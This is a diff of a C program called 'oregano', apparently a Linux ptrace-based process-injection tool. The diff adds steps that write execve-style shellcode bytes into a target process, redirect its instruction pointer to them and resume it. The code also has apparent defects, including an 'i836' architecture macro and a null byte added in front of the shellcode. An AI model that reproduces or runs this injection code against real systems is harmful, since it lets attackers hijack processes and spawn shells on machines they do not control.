@@ -1,11 +1,11 @@
 // oregano.c
 // https://github.com/R-Rothrock/oregano
 
-//#include<stdio.h> // to be commented out on commit
+#include<stdio.h> // to be commented out on commit
 
 #define _GNU_SOURCE
 
-static char process_pathname[] = "./test";
+static char process_pathname[] = "./test.out";
 
 #include<stdlib.h>
 #include<sys/ptrace.h> /* ptrace() */
@@ -19,7 +19,7 @@ static char process_pathname[] = "./test";
   #define IP_REG RIP
   #define PTR_T u_int64_t
 
-  static u_int8_t shellcode1[] = {0x48, 0xb8};
+  static u_int8_t shellcode1[] = {0x00, 0x48, 0xb8};
   static u_int8_t shellcode2[] = {
     0x99, 0x50, 0x54, 0x5f, 0x52,
     0x5e, 0x6a, 0x3b, 0x58, 0x0f,
@@ -116,9 +116,13 @@ int main(int argc, char *argv[])
 
   //perror("Status"); // to be commented out on commit
 
-  ptrace(PTRACE_DETACH, pid, 0, 0);
+  #if defined(x86_64) || defined(i836)
+    ptrace(PTRACE_POKEUSER, pid, sizeof(long) * IP_REG, ip);
+  #endif
 
-  //perror("Status"); // to be commented out on commit
+  ptrace(PTRACE_CONT, pid, 18, 0);
+
+  perror("Status"); // to be commented out on commit
 
   return 0;
 }
